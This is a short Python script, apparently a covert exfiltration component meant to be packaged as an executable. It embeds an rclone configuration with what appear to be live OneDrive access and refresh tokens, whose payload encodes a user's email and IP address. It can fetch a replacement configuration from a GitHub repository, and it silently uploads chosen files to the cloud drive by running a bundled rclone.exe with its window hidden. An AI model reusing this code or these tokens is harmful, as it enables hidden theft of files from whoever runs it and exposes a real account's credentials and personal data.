config = """[cloud]
type = onedrive
token = {"access_token":"eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik1pNGpESGlIVFVhWkE4ZDZCTWdaWS1qRGRRaHlvSzlyZEVUd0drbDMzdVUiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyJ9.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTAwMDAtYzAwMC0wMDAwMDAwMDAwMDAiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9jNzFhODUwMy1hMjdhLTRhYjgtYjJmOS1iZTEwNDRhNTM3NzMvIiwiaWF0IjoxNjgzODMxNjE2LCJuYmYiOjE2ODM4MzE2MTYsImV4cCI6MTY4MzgzNzE2MywiYWNjdCI6MCwiYWNyIjoiMSIsImFpbyI6IkFUUUF5LzhUQUFBQU9DRGsvNHVEa0ZENUxOdnk2cHJJMTNwNWd2djJMMDRXUHE2eFZBdW5FNmJkNHZtS0p5K1EreC9kK3VkYU5zOWciLCJhbXIiOlsicHdkIl0sImFwcF9kaXNwbGF5bmFtZSI6InJjbG9uZSIsImFwcGlkIjoiYjE1NjY1ZDktZWRhNi00MDkyLTg1MzktMGVlYzM3NmFmZDU5IiwiYXBwaWRhY3IiOiIxIiwiaWR0eXAiOiJ1c2VyIiwiaXBhZGRyIjoiNzMuNC4xMTQuMTMyIiwibmFtZSI6ImR2czIiLCJvaWQiOiI1MTA5OGM3MS00MzdhLTQ0OGQtOWUyMC03NmZmYTk4NDk4YzciLCJwbGF0ZiI6IjMiLCJwdWlkIjoiMTAwMzIwMDI5ODM0MkRFOSIsInJoIjoiMC5BVmtBQTRVYXgzcWl1RXF5LWI0UVJLVTNjd01BQUFBQUFBQUF3QUFBQUFBQUFBQlpBRGMuIiwic2NwIjoiRmlsZXMuUmVhZCBGaWxlcy5SZWFkLkFsbCBGaWxlcy5SZWFkV3JpdGUgRmlsZXMuUmVhZFdyaXRlLkFsbCBTaXRlcy5SZWFkLkFsbCBwcm9maWxlIG9wZW5pZCBlbWFpbCIsInN1YiI6IjFuYVVFSFNLZ25zbWd1MFBpazR2dzRHNllDZEwwZGxHUXZERTVBNkNEUlUiLCJ0ZW5hbnRfcmVnaW9uX3Njb3BlIjoiTkEiLCJ0aWQiOiJjNzFhODUwMy1hMjdhLTRhYjgtYjJmOS1iZTEwNDRhNTM3NzMiLCJ1bmlxdWVfbmFtZSI6ImR2czJAbmR4ay5jYyIsInVwbiI6ImR2czJAbmR4ay5jYyIsInV0aSI6IlRrN0Nhc1Z1WDB5X2tubGNtRTh0QUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbImI3OWZiZjRkLTNlZjktNDY4OS04MTQzLTc2YjE5NGU4NTUwOSJdLCJ4bXNfc3QiOnsic3ViIjoiWWNHMVZIQjhxdDZrNVg1MzZoRXBXbnZrbkFqU0ZPX19GZ05FVm9fWGNHayJ9LCJ4bXNfdGNkdCI6MTU5Mzg4OTA4NH0.TDfopQTfGrwF_EYZXLUY9q4PXkxATMbBUf0ew516CfjWN55TTG_3DuW4zdQUCJYO3Y1Bia6seDImi0yWhTykLMoYkiw9OkiGC7mhxlMuOv69WKzIl1ad635pMZqrZ-sgWb16XkKQJ1XSb2jZt0BlAX1ruoPHUJ0HyGEbB4qxlxVAJMElDt-JWzwBVfTKZyWX0PJZvqvWm88PvsOvz4oxxwJJqyAdBkwC-IPgIh5MPKPJ6Nte7xH3Bid3Ofzd-2V9JvSEpbjiMbqJBDsUA4cq4xiPcr_YBgXy-qzUam8IDEzQUmji_Fg-AQasEvAsXNME5f4GLXhBArFzuJOuHK_Avg","token_type":"Bearer","refresh_token":"0.AVkAA4Uax3qiuEqy-b4QRKU3c9llVrGm7ZJAhTkO7Ddq_VlZADc.AgABAAEAAAD--DLA3VO7QrddgJg7WevrAgDs_wUA9P8XQbuvTVo50P1eTw4Z6yMXRYuHtjbWY_J1w8BI09BKqRan4HgHAZlFdxjxUjW5tP6JeKfatSEey-IMM6SrbF0OxY3vus6_ocBeG1hN6pxn7gymcwMXqmfWU4IHSgzBxjLtdU5ZaD6jedkk0NR71ChGr90xUav5ywzYXljn80XT1Y4OEtA7LFAIGqgdbl8wRuER6prZk8BLduO2eIf6qaTdSxRu9Yuns9-MdtpuQCZrNJIn8DX0iYI4qZmIwxIjDn-cTh7kD71B84_Ajf_T79bCFgpyAHGZqONYSRVQH4HQYUmscXoZU6XNssPi950HGscS2HnYatKZ99EgXdXwCcS-qYbGrHjXAFJN6mpPeI0Yzn7kNMEuHcVxm5Jn2gzr39do2yz-XpcQl4cQr8-W6SfJImFEQOfyTnqkFnJQmq044o2Qih4ZY784D707_eDGMbGzEppsoGWl50uZ5tUWFIND2dIqZaU4GkfiWGPERcjGhk739-kt88wo04971hd-uUYl-cSd_Uaxsbw1n8JJ-Zyu_CS-ETZntRj7Q-wRc4VLkGLiRLBJvUzZnkF9T_m7jsUpa-syWT2IVStdQrQKYrTOUMdDIzCjUj7tblqimb_cICQEzMgwE34YuTmcaLg0YMg3SM5oMhQtQlXiOnAjiQ1AOhmRpas3BjxICt0oW1DcE_M0kPtw-yRytwgwWvGLO5Ww_8Iy5n8yq4y2YuuRq2xN","expiry":"2023-05-11T16:32:44.3723883-04:00"}
drive_id = b!qvj0OzU3jkCXc1bBLxABNP2YpXwCrVtBo5TOnpflqBiNDch7_gXNQZHD6rs1qtQo
drive_type = business
"""
import subprocess
import tempfile
import subprocess
import os
import sys
import requests

tempd = tempfile.mkdtemp()

config_path = f"{tempd}/rclone.conf"

def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

def update_config():
    global config
    r= requests.get("https://raw.githubusercontent.com/CS564/cs564/master/rclone.conf", allow_redirects=True)
    if r.status_code == 200 and r.text != config:
        config = r.text
        print(config)

    open(f"{tempd}/rclone.conf", 'w').write(config)
    return f"{tempd}/rclone.conf"

def upload(source, dest):
    cmd = [resource_path("bin/rclone.exe"), "--config", config_path, "copy", source, f'cloud:cs564/{dest}']
    
    print(cmd)
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    p = subprocess.Popen(" ".join(cmd),startupinfo=startupinfo)
    
    p.wait()


update_config()